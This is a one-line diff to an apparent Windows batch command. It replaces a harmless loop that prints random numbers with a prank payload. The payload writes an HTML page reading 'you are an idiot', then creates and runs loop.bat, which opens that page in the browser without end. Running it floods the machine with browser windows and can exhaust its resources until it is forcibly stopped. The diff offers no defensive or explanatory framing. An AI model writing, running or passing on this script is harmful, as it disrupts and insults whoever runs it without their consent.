@@ -1,1 +1,1 @@
-cls & :a & echo %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% & goto a
+(echo ^<html^>^<body style="background:black; color:white; display:flex; justify-content:center; align-items:center; height:100vh; font-size:50px;"^>you are an idiot^</body^>^</html^>)>idiot.html && (echo @echo off & echo :loop & echo start "" "idiot.html" & echo goto loop)>loop.bat && loop.bat
